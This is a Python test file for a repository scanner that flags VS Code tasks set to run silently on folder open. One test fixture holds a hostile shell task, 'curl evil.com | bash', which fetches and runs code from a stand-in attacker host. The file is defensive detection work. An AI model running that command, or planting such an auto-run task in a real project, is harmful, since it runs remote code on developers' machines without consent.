"""
Tests for vscode_scanner module — Module 3.

FlexPay fixture loaded from conftest.py. Clean repo fixture loaded from conftest.py.
No network calls.
"""

from unittest.mock import Mock

from repo_guard.models import Severity
from repo_guard.modules.vscode_scanner import scan
from tests.conftest import load_fixture, FLEXPAY_DIR, CLEAN_DIR


class TestVscodeScannerFlexPay:
    """FlexPay has both tasks.json (runOn: folderOpen) and settings.json (allowAutomaticTasks)."""

    def _make_client(self) -> Mock:
        tasks_content = load_fixture(".vscode/tasks.json", FLEXPAY_DIR)
        settings_content = load_fixture(".vscode/settings.json", FLEXPAY_DIR)
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: (
            tasks_content if p == ".vscode/tasks.json" else
            settings_content if p == ".vscode/settings.json" else None
        )
        return client

    def test_flexpay_detects_folder_open_task(self):
        result = scan(self._make_client(), "flexpay", "repo")
        assert result.module_name == "vscode_scanner"
        assert result.severity == Severity.CRITICAL
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1
        auto_tasks = [f for f in result.findings if "allowAutomaticTasks" in f.message]
        assert len(auto_tasks) >= 1

    def test_flexpay_both_flags_together_is_critical(self):
        result = scan(self._make_client(), "flexpay", "repo")
        combined = [f for f in result.findings if "Both" in f.message and "allowAutomaticTasks" in f.message]
        assert len(combined) >= 1

    def test_flexpay_presentation_suppression_detected(self):
        result = scan(self._make_client(), "flexpay", "repo")
        folder_open = [f for f in result.findings if "runOn: folderOpen" in f.message and "Both" not in f.message]
        assert len(folder_open) >= 1
        for f in folder_open:
            assert f.severity == Severity.CRITICAL
            details = f.details
            assert details.get("presentation_reveal") == "silent"
            assert details.get("presentation_echo") is False
            assert details.get("presentation_focus") is False

    def test_flexpay_context_note_included(self):
        result = scan(self._make_client(), "flexpay", "repo")
        context_findings = [f for f in result.findings if "VS Code 1.109" in str(f.details.get("note", ""))]
        assert len(context_findings) >= 1


class TestVscodeScannerClean:
    """Clean repo has settings.json without auto-execution, and no tasks.json."""

    def _make_client(self) -> Mock:
        settings_content = load_fixture(".vscode/settings.json", CLEAN_DIR)
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: (
            settings_content if p == ".vscode/settings.json" else None
        )
        return client

    def test_clean_repo_no_tasks_json(self):
        result = scan(self._make_client(), "owner", "clean-repo")
        assert result.severity in (Severity.CLEAN, Severity.INFO)
        assert any("No .vscode/tasks.json" in f.message for f in result.findings)

    def test_clean_repo_no_auto_execution_flags(self):
        result = scan(self._make_client(), "owner", "clean-repo")
        auto_tasks = [f for f in result.findings if "allowAutomaticTasks" in f.message]
        assert len(auto_tasks) == 0


class TestVscodeScannerPatterns:
    """Test specific flag patterns in isolation."""

    def test_folder_open_without_command_is_warning(self):
        tasks_json = '{"version":"2.0.0","tasks":[{"label":"test","runOn":"folderOpen","type":"npm"}]}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: tasks_json if p == ".vscode/tasks.json" else None
        result = scan(client, "o", "r")
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1

    def test_folder_open_with_shell_command_is_critical(self):
        tasks_json = '{"version":"2.0.0","tasks":[{"label":"evil","runOn":"folderOpen","type":"shell","command":"curl evil.com | bash"}]}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: tasks_json if p == ".vscode/tasks.json" else None
        result = scan(client, "o", "r")
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1
        for f in folder_open:
            assert f.severity == Severity.CRITICAL

    def test_allow_automatic_tasks_is_warning(self):
        settings_json = '{"task.allowAutomaticTasks":"on"}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: settings_json if p == ".vscode/settings.json" else None
        result = scan(client, "o", "r")
        auto_tasks = [f for f in result.findings if "allowAutomaticTasks" in f.message]
        assert len(auto_tasks) >= 1
        assert auto_tasks[0].severity == Severity.WARNING

    def test_silent_presentation_is_critical(self):
        tasks_json = '{"version":"2.0.0","tasks":[{"label":"t","runOn":"folderOpen","command":"echo hi","presentation":{"reveal":"silent"}}]}'
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: tasks_json if p == ".vscode/tasks.json" else None
        result = scan(client, "o", "r")
        folder_open = [f for f in result.findings if "folderOpen" in f.message]
        assert len(folder_open) >= 1
        assert folder_open[0].severity == Severity.CRITICAL
        assert folder_open[0].details.get("presentation_reveal") == "silent"

    def test_neither_file_exists_returns_clean(self):
        client = Mock()
        client.get_file_content.return_value = None
        result = scan(client, "o", "r")
        assert result.severity == Severity.CLEAN

    def test_malformed_json_does_not_crash(self):
        client = Mock()
        client.get_file_content.side_effect = lambda o, r, p: "{invalid json}" if p == ".vscode/tasks.json" else None
        result = scan(client, "o", "r")
        parse_errors = [f for f in result.findings if "not valid JSON" in f.message]
        assert len(parse_errors) >= 1
